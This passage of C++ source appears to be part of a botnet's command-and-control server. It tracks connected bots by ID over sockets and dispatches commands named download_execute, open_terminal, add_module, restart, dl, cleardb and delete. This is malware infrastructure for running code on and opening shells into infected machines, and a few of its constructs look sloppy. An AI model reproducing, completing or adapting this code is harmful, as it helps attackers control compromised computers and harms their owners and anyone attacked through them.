	static Ptr<std::vector<Ptr<PCOMMAND_LIST>>> CommandList;

	// Command parameter constants
	static const UINT _ref_command			= 0;
	static const UINT _ref_operand_target	= 1; // Either ALL, or a specific ID
	static const UINT _ref_module_name		= 2; // Module name. Not all commands require this.

/*--------[Module Instance]-----------------------------------------------------------------*/
	class instance;
#define ACTIVE_INSTANCE_SYNC(x)				cEnterCriticalSection(x);
#define ACTIVE_INSTANCE_UNSYNC(x)			cLeaveCriticalSection(x);
	
	bool check_if_instance_exists(__in bot_protocol::instance& current_instance,
								  __in const std::vector<bot_protocol::instance *>& active_instances);
	
	void add_to_instance_list(__in bot_protocol::instance& current_instance,
							  __inout std::vector<bot_protocol::instance *>& active_instances);

	void remove_from_instance_list(__in bot_protocol::instance& current_instance,
									__inout std::vector<bot_protocol::instance *>& active_instances);
								   //__inout std::vector<bot_protocol::instance *>& current_instances);
	
	instance *find_instance(__in id_info::id& current_id,
							__in const std::vector<bot_protocol::instance *>& active_instances);

	class instance {
	private:
		Ptr<socket_tools::socket_data>		CommSocket;

		// Hello information
		Ptr<bot_protocol::proto_hello>		ProtoHello;
		socket_tools::data					*hello_data;

		// Restart info
		Ptr<bot_protocol::proto_restart>	ProtoRestart;

		str_string							*bot_id_string;
		DWORD								bot_id_dword;

		Ptr<bot_protocol::proto_sync>		Sync;

		// Info
		Ptr<bot_protocol::proto_info_agg>	Info;
	public:
		instance(__in const socket_tools::socket_data *comm_socket) :
			CommSocket(NULL), bot_id_string(NULL), hello_data(NULL),
			bot_id_dword(0), ProtoRestart(NULL), Sync(NULL)
		{
			CommSocket = new socket_tools::socket_data(comm_socket);
		}

		instance(__in const SOCKET tx_socket) :
			CommSocket(NULL), bot_id_string(NULL), hello_data(NULL),
			bot_id_dword(0), ProtoRestart(NULL), Sync(NULL)
		{
			CommSocket = new socket_tools::socket_data(tx_socket);

#ifdef _CONFIG_USE_ENCRYPTION
			// Waits for the client to send a request
			bool channel_status = CommSocket->setup_encryption_server();
			if (channel_status == false) {
				this->CommSocket.clear();
				return;
			}
#endif
		}

		~instance(VOID)
		{
			this->CommSocket;
		}

		SOCKET instance::get_comm_socket(VOID) const
		{
			if (CommSocket.get_is_null() == true) {
				return INVALID_SOCKET;
			}

			if (CommSocket->get_socket() == INVALID_SOCKET) {
				return INVALID_SOCKET;
			}

			return this->CommSocket->get_socket();
		}

		socket_tools::socket_data *instance::get_comm_socket_(VOID) const
		{
			if (CommSocket->get_socket() == INVALID_SOCKET) {
				return NULL;
			}

			return this->CommSocket.get_value();
		}

		socket_tools::socket_data& instance::get_comm_socket__(void) const
		{
			return *this->CommSocket;
		}

		bool instance::receive_proto_hello(__in socket_tools::socket_data *tx_socket);

		str_string *instance::get_bot_id_raw(VOID)
		{
			if (this->bot_id_string == NULL) {
				this->bot_id_string = this->ProtoHello->get_id()->get_string();
			}

			return this->bot_id_string;
		}

		id_info::id& instance::get_bot_id_(void) const
		{
			return this->ProtoHello->get_id_();
		}

		DWORD instance::get_bot_id_dword(VOID)
		{
			//if (this->bot_id_dword == 0) {
			//	this->bot_id_dword = this->ProtoHello->get_id()->get_dword();
			//} 

			return this->bot_id_dword;
		}

		bool instance::restart_connection(VOID)
		{
			// First send the RESTART signal, Then the object will be destroyed
			ProtoRestart = new bot_protocol::proto_restart(this->CommSocket.get_value());

			return ProtoRestart->get_is_ok();
		}

		// add_module class performs all parsing
		bool instance::add_module(__in const text_io::input& raw_data) const;

		// Returns the sync id value (used by module)
		DWORD instance::get_sync_id_number(types::DEFAULT_NO_PARAMETERS) const;

		// Processes the instance sync command - creates this->Sync
		bool instance::process_sync(void);

		// Returns info data
		proto_info::info_data *get_info_data(void) const
		{
			return this->Info->get_client_info();
		}

		// Processes the INFO command
		bool instance::process_info(void);

		// Sends the instance cleardb command
		bool instance::command_cleardb(__in const socket_tools::socket_data& active_socket,
									   __in const id_info::id& instance_id) const;

		// Sends out delete command
		bool instance::command_delete(__in const text_io::input& raw_data) const;
	};

	// Bot Command Processor /////////////////////////////////////////////////////
	// Performs primary bot<->aggregator command parsing
#define CMD_PROC_TYPE __cdecl
	typedef void CMD_PROC_CALLBACK;
	class command_processor {
	private:
		HANDLE			processor_handle;

		StrString		DefaultPrompt;

		bool			is_ok;
	public:
		command_processor(types::DEFAULT_NO_PARAMETERS) :
			processor_handle(INVALID_HANDLE_VALUE),
			DefaultPrompt(new str_string(virtual_proc_prompt)),
			is_ok(false)
		{
			this->processor_handle = cCreateThread(	NULL, 0, 
													(LPTHREAD_START_ROUTINE)processor,
													(LPVOID)this,
													0,
													NULL);
			if (this->processor_handle == NULL) {
				return;
			}

			this->is_ok = true;

			return;
		}
		
		~command_processor(types::DEFAULT_NO_PARAMETERS)
		{

		}

		//
		bool get_is_ok(types::DEFAULT_NO_PARAMETERS) const
		{
			return this->is_ok;
		}

	private:
		static CMD_PROC_CALLBACK __declspec(noreturn) CMD_PROC_TYPE processor(
			__in command_processor *this_ptr)
		{
			while (TRUE) {
				Ptr<text_io::input> CurrentInput = new text_io::input(*this_ptr->DefaultPrompt);
				if (CurrentInput->get_is_anything() == false) {
					cSleep(10);
					continue;
				}

				// Dispatch
			}
		}
	};


	bool process_data(__in const socket_tools::data& inbound_data, 
		__in const id_info::id& id);
	typedef bool (*command_processor_handler)(__in const socket_tools::data& raw_data,
												__in const id_info::id& id);
	typedef struct {
		LPSTR						signature;
		command_processor_handler	processor_handler;
	} COMMAND_PROCESSOR, *PCOMMAND_PROCESSOR;
	static const COMMAND_PROCESSOR command_processor_list[number_of_commands] = {
		{	_sig_info,						&process_info},
		{	_sig_download_execute,			&process_download_execute},
		{	_sig_add_module,				&process_add_module},
		{	_sig_open_terminal,				&process_open_terminal},
		{	_sig_restart,					&process_restart},
		{	_sig_dl,						&process_dl},
		{   _sig_cleardb,					&process_cleardb},
		{   _sig_delete,					&process_delete}
	};
}